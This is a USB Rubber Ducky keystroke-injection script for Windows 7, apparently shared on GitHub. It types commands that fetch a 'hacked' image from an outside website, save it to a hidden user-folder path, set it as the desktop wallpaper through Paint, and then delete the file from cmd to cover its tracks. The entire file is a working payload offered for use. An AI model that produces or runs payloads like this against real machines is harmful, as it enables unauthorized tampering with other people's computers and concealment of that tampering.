REM Title: duckywall
REM Author: jaeger
REM Version: 1.0.0
REM Date: 20181019
REM Category: ducky payload
REM Target: Windows 7 
REM Dependencies: Chrome or Firefox as default browser; Internet access to download image
REM Description: Updated version of a classic Ducky script
REM		-corrects minor command errors on other GitHub versions
REM		-creates longer delay to allow time for slow browser launch and file server connection 
REM		-works regardless of default application used to open png files
REM		-add delays between some steps that were causing various failures in Win7
REM		-saves image to a non-visible path (%userprofile% rather than desktop)
REM		-deletes saved image before exiting

DELAY 1000
GUI r
DELAY 500
REM next line  works with Firefox or Chrome as default browser; buggy when IE is default 
STRING https://blog.threatpress.com/wp-content/uploads/2018/01/hacked-910x485.png
ENTER
REM Next delay will need to vary 1000-8000 based on time needed to open browser and get image
DELAY 7000
REM Next portion saves the image to the user's folder
CTRL s
DELAY 500
STRING %userprofile%\wallpaper-x
ENTER
DELAY 500
REM Next portion closes browser
ALT f
DELAY 200
STRING X
DELAY 200
GUI d 
REM Next portion opens image in Microsoft Paint and saves it as new desktop wallpaper
REM Paint was selected because various default image apps require different commands or steps
DELAY 500
GUI r
DELAY 500
STRING C:\Windows\system32\mspaint.exe %userprofile%\wallpaper-x.png
DELAY 500
ENTER
DELAY 500
ALT F
DELAY 500
STRING B
DELAY 500
ALT F
DELAY 500
STRING X
REM Next portion deletes the saved image file for easier clean-up for testing or restoration
DELAY 500
GUI r
DELAY 500
STRING cmd 
ENTER
DELAY 500
STRING del %userprofile%\wallpaper-x.png
DELAY 200
ENTER
STRING exit
DELAY 200
ENTER
REM Eternal props to Hak5!